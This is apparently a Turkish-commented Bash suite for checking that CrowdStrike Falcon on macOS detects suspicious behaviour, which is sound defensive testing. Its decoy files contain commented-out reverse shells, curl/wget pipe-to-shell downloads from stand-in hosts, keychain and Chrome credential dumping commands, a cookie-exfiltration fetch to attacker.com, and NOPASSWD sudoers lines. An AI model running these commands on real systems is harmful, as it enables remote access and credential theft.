#!/bin/bash

################################################################################
# CrowdStrike Falcon Detection Test Suite for macOS
#
# Bu script CrowdStrike Falcon'un macOS endpoint'lerde düzgün çalışıp 
# çalışmadığını test eder.
# SADECE TEST ORTAMINDA KULLANIN!
#
# Kullanım: sudo ./crowdstrike-test-macos.sh
################################################################################

# Renkler
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Log dosyası
LOG_FILE="/tmp/CrowdStrikeTest_$(date +%Y%m%d_%H%M%S).log"

# Test sayaçları
TEST_COUNT=0
DETECTED_COUNT=0
TOTAL_TESTS=10

# Log fonksiyonu
log_message() {
    local level=$1
    shift
    local message="$@"
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    local log_entry="[$timestamp] [$level] $message"
    
    case $level in
        "SUCCESS")
            echo -e "${GREEN}${log_entry}${NC}"
            ;;
        "WARNING")
            echo -e "${YELLOW}${log_entry}${NC}"
            ;;
        "ERROR")
            echo -e "${RED}${log_entry}${NC}"
            ;;
        *)
            echo -e "${CYAN}${log_entry}${NC}"
            ;;
    esac
    
    echo "$log_entry" >> "$LOG_FILE"
}

# CrowdStrike Falcon sensor kontrolü
check_falcon_sensor() {
    log_message "INFO" "CrowdStrike Falcon Sensor kontrolü yapılıyor..."
    
    # Falcon sensor process kontrolü
    if pgrep -x "falcond" > /dev/null 2>&1; then
        log_message "SUCCESS" "CrowdStrike Falcon Sensor çalışıyor (falcond process aktif)"
        return 0
    fi
    
    # System extension kontrolü
    if systemextensionsctl list | grep -q "com.crowdstrike"; then
        log_message "SUCCESS" "CrowdStrike System Extension yüklü"
        
        # Process tekrar kontrol
        if pgrep -f "CrowdStrike" > /dev/null 2>&1; then
            log_message "SUCCESS" "CrowdStrike process'leri aktif"
            return 0
        else
            log_message "WARNING" "CrowdStrike extension yüklü ama process aktif değil"
            return 1
        fi
    fi
    
    log_message "ERROR" "CrowdStrike Falcon Sensor bulunamadı!"
    log_message "ERROR" "Lütfen Falcon sensor'ün yüklü ve çalışır durumda olduğundan emin olun."
    return 1
}

# Root kontrolü
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Bu script root yetkileriyle çalıştırılmalıdır!${NC}"
        echo -e "${YELLOW}Kullanım: sudo $0${NC}"
        exit 1
    fi
}

# Banner
print_banner() {
    clear
    echo "======================================================================"
    echo -e "${CYAN}  CROWDSTRIKE FALCON DETECTION TEST SUITE - macOS${NC}"
    echo -e "${YELLOW}  Test Environment Only - Safe Detection Tests${NC}"
    echo "======================================================================"
    echo ""
}

# Test başlangıcı
start_tests() {
    print_banner
    log_message "INFO" "Test başlatılıyor..."
    log_message "INFO" "Log dosyası: $LOG_FILE"
    echo ""
    
    # Sensor kontrolü
    if ! check_falcon_sensor; then
        echo ""
        echo -e "${RED}HATA: CrowdStrike Falcon Sensor aktif değil!${NC}"
        echo -e "${YELLOW}Lütfen sensor'ü kontrol edin:${NC}"
        echo "  1. System Preferences → Security & Privacy → Full Disk Access"
        echo "  2. CrowdStrike Falcon'un izinleri kontrol edin"
        echo "  3. Terminal: sudo /Applications/Falcon.app/Contents/Resources/falconctl stats"
        echo ""
        read -p "Devam etmek istiyor musunuz? (y/n) " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
    
    echo ""
}

################################################################################
# TEST 1: EICAR Test Dosyası
################################################################################
test_eicar() {
    ((TEST_COUNT++))
    echo ""
    echo "[$TEST_COUNT/$TOTAL_TESTS] EICAR Standart Test Dosyası"
    log_message "INFO" "EICAR test dosyası oluşturuluyor..."
    
    local eicar_string='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    local eicar_path="/tmp/eicar_test.com"
    
    # EICAR dosyasını oluştur
    echo "$eicar_string" > "$eicar_path" 2>/dev/null
    local write_result=$?
    
    sleep 3
    
    if [[ $write_result -ne 0 ]]; then
        log_message "SUCCESS" "EICAR yazma girişimi engellendi (proactive prevention)"
        ((DETECTED_COUNT++))
    elif [[ ! -f "$eicar_path" ]]; then
        log_message "SUCCESS" "EICAR dosyası tespit edildi ve karantinaya alındı"
        ((DETECTED_COUNT++))
    else
        log_message "WARNING" "UYARI: EICAR dosyası tespit EDİLMEDİ!"
        rm -f "$eicar_path" 2>/dev/null
    fi
}

################################################################################
# TEST 2: Şüpheli Shell Script
################################################################################
test_suspicious_shell_script() {
    ((TEST_COUNT++))
    echo ""
    echo "[$TEST_COUNT/$TOTAL_TESTS] Şüpheli Shell Script Tespiti"
    log_message "INFO" "Şüpheli shell script test ediliyor..."
    
    local script_path="/tmp/suspicious_script.sh"
    
    cat > "$script_path" << 'EOF'
#!/bin/bash
# SADECE TEST - Bu script gerçekte çalıştırılmaz
# CrowdStrike behavioral detection'ını test eder

# Reverse shell pattern (not executed):
# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
# nc -e /bin/bash attacker.com 4444
# python -c 'import socket...'

# Suspicious commands (commented):
# curl http://malicious.com/payload.sh | bash
# wget -O - http://evil.com/script | sh

echo "Bu sadece bir test - gerçek execution yok"
EOF

    chmod +x "$script_path"
    sleep 3
    
    if [[ ! -f "$script_path" ]]; then
        log_message "SUCCESS" "Şüpheli script tespit edildi ve engellendi"
        ((DETECTED_COUNT++))
    else
        log_message "INFO" "Script dosyası oluşturuldu (execution-based detection bekleniyor)"
        rm -f "$script_path" 2>/dev/null
    fi
}

################################################################################
# TEST 3: Credential Access - Keychain Dump Pattern
################################################################################
test_keychain_access_pattern() {
    ((TEST_COUNT++))
    echo ""
    echo "[$TEST_COUNT/$TOTAL_TESTS] Credential Access IOA - Keychain Pattern"
    log_message "INFO" "Keychain access pattern test ediliyor..."
    
    local test_file="/tmp/keychain_dump_test.sh"
    
    cat > "$test_file" << 'EOF'
#!/bin/bash
# SADECE TEST - Bu gerçek keychain dumping değildir
# CrowdStrike Credential Access IOA'sını test eder

# Keychain dumping commands (not executed):
# security dump-keychain -d login.keychain
# security find-generic-password -wa "password"
# security dump-trust-settings
# chainbreaker --dump-all

# Browser credential theft (commented):
# sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data

echo "Keychain Access IOA Test - No actual dumping"
EOF

    chmod +x "$test_file"
    sleep 3
    
    if [[ ! -f "$test_file" ]]; then
        log_message "SUCCESS" "Keychain access pattern tespit edildi"
        ((DETECTED_COUNT++))
    else
        log_message "INFO" "Static keychain pattern tespiti aktif değil (execution-based)"
        rm -f "$test_file" 2>/dev/null
    fi
}

################################################################################
# TEST 4: LaunchAgent Persistence (T1543)
################################################################################
test_persistence_mechanism() {
    ((TEST_COUNT++))
    echo ""
    echo "[$TEST_COUNT/$TOTAL_TESTS] Persistence IOA - LaunchAgent Creation"
    log_message "INFO" "LaunchAgent persistence pattern test ediliyor..."
    
    local plist_path="/tmp/com.test.crowdstrike.plist"
    
    cat > "$plist_path" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.test.crowdstrike</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>echo "Test LaunchAgent - Not malicious"</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

    sleep 3
    
    if [[ ! -f "$plist_path" ]]; then
        log_message "SUCCESS" "Suspicious LaunchAgent tespit edildi"
        ((DETECTED_COUNT++))
    else
        log_message "INFO" "LaunchAgent file oluşturuldu (/tmp klasöründe - normal lokasyon değil)"
        rm -f "$plist_path" 2>/dev/null
    fi
    
    # Not: Gerçek persistence ~/Library/LaunchAgents/'da olurdu ama onu test etmiyoruz
    log_message "INFO" "Not: Gerçek ~/Library/LaunchAgents/ yazma testi yapılmadı (sistem güvenliği için)"
}

################################################################################
# TEST 5: Rapid File Creation (Ransomware Behavior)
################################################################################
test_ransomware_behavior() {
    ((TEST_COUNT++))
    echo ""
    echo "[$TEST_COUNT/$TOTAL_TESTS] Machine Learning IOA - Ransomware Behavior"
    log_message "INFO" "Hızlı dosya oluşturma pattern test ediliyor..."
    
    local test_folder="/tmp/rapid_file_test_cs_macos"
    mkdir -p "$test_folder"
    
    local files_created=0
    local file_extensions=(".doc" ".xls" ".pdf" ".txt" ".jpg" ".png")
    
    for i in {1..50}; do
        local ext_index=$((i % 6))
        local ext="${file_extensions[$ext_index]}"
        local file_path="$test_folder/document_$i$ext"
        
        echo "Original content $i - $(date +%s)" > "$file_path" 2>/dev/null
        
        if [[ -f "$file_path" ]]; then
            ((files_created++))
        else
            break
        fi
        
        sleep 0.05
    done
    
    sleep 3
    
    if [[ $files_created -ge 45 ]]; then
        log_message "INFO" "Ransomware behavioral pattern engellemedi ($files_created/50)"
    else
        log_message "SUCCESS" "Ransomware behavior tespit edildi ve engellendi ($files_created/50)"
        ((DETECTED_COUNT++))
    fi
    
    rm -rf "$test_folder" 2>/dev/null
}

################################################################################
# TEST 6: Suspicious Process Execution - Python Reverse Shell
################################################################################
test_python_reverse_shell() {
    ((TEST_COUNT++))
    echo ""
    echo "[$TEST_COUNT/$TOTAL_TESTS] Execution IOA - Python Reverse Shell Pattern"
    log_message "INFO" "Python reverse shell pattern test ediliyor..."
    
    local python_script="/tmp/reverse_shell_test.py"
    
    cat > "$python_script" << 'EOF'
#!/usr/bin/env python3
"""
SADECE TEST - Bu script çalıştırılmaz
CrowdStrike Python execution IOA'sını test eder

Reverse shell pattern (commented out):
import socket, subprocess, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])

Test purpose only - no actual connection
"""

print("Python Reverse Shell Test - No actual execution")
EOF

    chmod +x "$python_script"
    sleep 3
    
    if [[ ! -f "$python_script" ]]; then
        log_message "SUCCESS" "Python reverse shell pattern tespit edildi"
        ((DETECTED_COUNT++))
    else
        log_message "INFO" "Python script file tespiti aktif değil (runtime detection)"
        rm -f "$python_script" 2>/dev/null
    fi
}

################################################################################
# TEST 7: Browser Extension Installation (T1176)
################################################################################
test_browser_extension_pattern() {
    ((TEST_COUNT++))
    echo ""
    echo "[$TEST_COUNT/$TOTAL_TESTS] Persistence IOA - Browser Extension Pattern"
    log_message "INFO" "Browser extension pattern test ediliyor..."
    
    local ext_path="/tmp/test_extension"
    mkdir -p "$ext_path"
    
    cat > "$ext_path/manifest.json" << 'EOF'
{
  "manifest_version": 3,
  "name": "Test Extension - CrowdStrike IOA Test",
  "version": "1.0",
  "permissions": [
    "activeTab",
    "cookies",
    "webRequest"
  ],
  "background": {
    "service_worker": "background.js"
  }
}
EOF

    cat > "$ext_path/background.js" << 'EOF'
// SADECE TEST - Bu gerçek malicious extension değildir
// Data exfiltration pattern (not executed):
// chrome.cookies.getAll({}, function(cookies) {
//     fetch('http://attacker.com/steal', {
//         method: 'POST',
//         body: JSON.stringify(cookies)
//     });
// });

console.log("Test Extension - No actual data theft");
EOF

    sleep 3
    
    if [[ ! -d "$ext_path" ]]; then
        log_message "SUCCESS" "Browser extension pattern tespit edildi"
        ((DETECTED_COUNT++))
    else
        log_message "INFO" "Browser extension file pattern oluşturuldu (/tmp'de - normal lokasyon değil)"
        rm -rf "$ext_path" 2>/dev/null
    fi
}

################################################################################
# TEST 8: Sudoers File Modification Attempt
################################################################################
test_privilege_escalation() {
    ((TEST_COUNT++))
    echo ""
    echo "[$TEST_COUNT/$TOTAL_TESTS] Privilege Escalation IOA - Sudoers Pattern"
    log_message "INFO" "Privilege escalation pattern test ediliyor..."
    
    local test_sudoers="/tmp/test_sudoers"
    
    cat > "$test_sudoers" << 'EOF'
# SADECE TEST - Bu gerçek sudoers değişikliği değildir
# CrowdStrike Privilege Escalation IOA'sını test eder

# Dangerous sudoers entries (not applied):
# testuser ALL=(ALL) NOPASSWD: ALL
# %admin ALL=(ALL) NOPASSWD: /bin/bash

Test file for privilege escalation detection
EOF

    sleep 3
    
    if [[ ! -f "$test_sudoers" ]]; then
        log_message "SUCCESS" "Sudoers modification pattern tespit edildi"
        ((DETECTED_COUNT++))
    else
        log_message "INFO" "Test sudoers file oluşturuldu (/tmp'de - gerçek /etc/sudoers değil)"
        rm -f "$test_sudoers" 2>/dev/null
    fi
    
    log_message "INFO" "Not: Gerçek /etc/sudoers yazma testi yapılmadı (sistem güvenliği için)"
}

################################################################################
# TEST 9: Network Connection - C2 Beaconing Pattern
################################################################################
test_network_beaconing() {
    ((TEST_COUNT++))
    echo ""
    echo "[$TEST_COUNT/$TOTAL_TESTS] Network IOA - C2 Beaconing Pattern"
    log_message "INFO" "Network beaconing pattern test ediliyor..."
    
    # Test domain (EICAR-related - safe)
    local test_domain="www.eicar.org"
    
    log_message "INFO" "DNS sorgusu yapılıyor: $test_domain"
    
    if nslookup "$test_domain" > /dev/null 2>&1; then
        log_message "INFO" "DNS çözümleme başarılı (test domain)"
    else
        log_message "INFO" "DNS sorgusu başarısız (network izole olabilir)"
    fi
    
    sleep 2
    
    log_message "INFO" "Network IOA monitoring aktif (connections logged)"
    log_message "INFO" "Not: Gerçek C2 connection simülasyonu yapılmadı (güvenlik için)"
}

################################################################################
# TEST 10: Process Injection via DYLD (T1055)
################################################################################
test_process_injection_pattern() {
    ((TEST_COUNT++))
    echo ""
    echo "[$TEST_COUNT/$TOTAL_TESTS] Process Injection IOA - DYLD Injection Pattern"
    log_message "INFO" "Process injection pattern test ediliyor..."
    
    local dylib_test="/tmp/test_injection.c"
    
    cat > "$dylib_test" << 'EOF'
/*
SADECE TEST - Bu kod compile edilmez
CrowdStrike process injection IOA'sını test eder

macOS Process Injection Techniques (not executed):
1. DYLD_INSERT_LIBRARIES injection
2. task_for_pid() + thread_create_running()
3. Mach port manipulation
4. Code signing bypass attempts

Example (commented):
// extern kern_return_t task_for_pid(mach_port_t target_task, pid_t pid, mach_port_t *task);
// extern kern_return_t vm_allocate(vm_map_t target_task, vm_address_t *address, vm_size_t size, int flags);
// extern kern_return_t vm_write(vm_map_t target_task, vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

Test for process injection behavioral detection
*/

#include <stdio.h>
int main() {
    printf("Process Injection Test - No actual injection\n");
    return 0;
}
EOF

    sleep 3
    
    if [[ ! -f "$dylib_test" ]]; then
        log_message "SUCCESS" "Process injection pattern tespit edildi"
        ((DETECTED_COUNT++))
    else
        log_message "INFO" "Static injection string tespiti aktif değil (runtime-based)"
        rm -f "$dylib_test" 2>/dev/null
    fi
}

################################################################################
# FALCON SENSOR STATUS CHECK
################################################################################
check_sensor_status() {
    echo ""
    echo "======================================================================"
    echo -e "${CYAN}  FALCON SENSOR STATUS - macOS${NC}"
    echo "======================================================================"
    echo ""
    
    # Falcon process kontrolü
    echo -e "${BOLD}Falcon Process Status:${NC}"
    if pgrep -x "falcond" > /dev/null 2>&1; then
        echo -e "  falcond: ${GREEN}Running${NC}"
    else
        echo -e "  falcond: ${RED}Not Running${NC}"
    fi
    
    # System extension kontrolü
    echo ""
    echo -e "${BOLD}System Extension Status:${NC}"
    if systemextensionsctl list | grep -q "com.crowdstrike"; then
        echo -e "  CrowdStrike Extension: ${GREEN}Loaded${NC}"
        systemextensionsctl list | grep "com.crowdstrike" | head -3
    else
        echo -e "  CrowdStrike Extension: ${RED}Not Loaded${NC}"
    fi
    
    # Falcon stats (gerekli izinlerle)
    echo ""
    echo -e "${BOLD}Falcon Statistics:${NC}"
    if [[ -f "/Applications/Falcon.app/Contents/Resources/falconctl" ]]; then
        /Applications/Falcon.app/Contents/Resources/falconctl stats 2>/dev/null | head -10 || echo "  Stats unavailable (permission required)"
    else
        echo "  falconctl bulunamadı"
    fi
    
    echo ""
}

################################################################################
# SONUÇLAR
################################################################################
print_results() {
    echo ""
    echo "======================================================================"
    echo -e "${CYAN}  TEST SONUÇLARI${NC}"
    echo "======================================================================"
    echo ""
    
    local detection_rate=$(awk "BEGIN {printf \"%.2f\", ($DETECTED_COUNT / $TOTAL_TESTS) * 100}")
    
    echo "Toplam Test: $TOTAL_TESTS"
    echo -e "Tespit Edilen: ${GREEN}$DETECTED_COUNT${NC}"
    
    if (( $(echo "$detection_rate >= 75" | bc -l) )); then
        echo -e "Tespit Oranı: ${GREEN}$detection_rate%${NC}"
    elif (( $(echo "$detection_rate >= 50" | bc -l) )); then
        echo -e "Tespit Oranı: ${YELLOW}$detection_rate%${NC}"
    else
        echo -e "Tespit Oranı: ${RED}$detection_rate%${NC}"
    fi
    
    echo ""
    echo -e "${YELLOW}CROWDSTRIKE DETECTION ANALİZİ (macOS):${NC}"
    echo ""
    
    if (( $(echo "$detection_rate >= 20" | bc -l) )); then
        log_message "SUCCESS" "SONUÇ: CrowdStrike Falcon çalışıyor - EDR tespitleri aktif"
        echo ""
        echo -e "${CYAN}Not: CrowdStrike birçok davranışı ENGELLEME yerine LOGLAMA modunda çalışır.${NC}"
        echo -e "${CYAN}Düşük tespit oranı NORMAL olabilir. Önemli olan:${NC}"
        echo "  1. Falcon Console'da event'lerin görünmesi"
        echo "  2. Detection'ların loglanması"
        echo "  3. Prevention policy'ye göre aksiyonlar"
    elif (( $(echo "$detection_rate >= 10" | bc -l) )); then
        log_message "WARNING" "SONUÇ: CrowdStrike Falcon aktif ama detection mode'da"
        echo ""
        echo -e "${YELLOW}Prevention policy kontrol edin - sadece detection mode olabilir${NC}"
    else
        log_message "ERROR" "SONUÇ: CrowdStrike Falcon tespiti çok düşük - inceleme gerekli"
        echo ""
        echo -e "${RED}Olası sorunlar:${NC}"
        echo "  - Sensor tam bağlanmamış olabilir"
        echo "  - Full Disk Access izni verilmemiş olabilir"
        echo "  - Prevention policy aktif değil"
        echo "  - System Extension onaylanmamış olabilir"
    fi
    
    echo ""
    log_message "INFO" "Detaylı log: $LOG_FILE"
    echo ""
    echo -e "${YELLOW}ÖNEMLİ: FALCON CONSOLE KONTROLÜ${NC}"
    echo "======================================================================"
    echo "1. Falcon Console → Investigate → Activity Logs"
    echo "2. Hostname ile arama yapın: $(hostname)"
    echo "3. Son 1 saatteki event'leri filtreleyin"
    echo "4. Detection type'lara göre sıralayın:"
    echo -e "   ${CYAN}- Malware detections (EICAR)${NC}"
    echo -e "   ${CYAN}- IOA detections (Behavioral patterns)${NC}"
    echo -e "   ${CYAN}- Machine Learning detections${NC}"
    echo "5. Prevention policy'nizi kontrol edin (Detect vs Prevent)"
    echo ""
    echo -e "${YELLOW}macOS'a ÖZEL KONTROLLER:${NC}"
    echo "1. System Preferences → Security & Privacy → Privacy → Full Disk Access"
    echo "   → CrowdStrike Falcon'un tick'i olmalı"
    echo "2. System Preferences → Security & Privacy → General"
    echo "   → System Extension onaylandı mı?"
    echo "3. Terminal: sudo /Applications/Falcon.app/Contents/Resources/falconctl stats"
    echo ""
    echo "======================================================================"
    echo ""
}

################################################################################
# MAIN
################################################################################
main() {
    # Root kontrolü
    check_root
    
    # Test başlat
    start_tests
    
    # Testleri çalıştır
    test_eicar
    test_suspicious_shell_script
    test_keychain_access_pattern
    test_persistence_mechanism
    test_ransomware_behavior
    test_python_reverse_shell
    test_browser_extension_pattern
    test_privilege_escalation
    test_network_beaconing
    test_process_injection_pattern
    
    # Sensor status
    check_sensor_status
    
    # Sonuçları göster
    print_results
}

# Script'i çalıştır
main
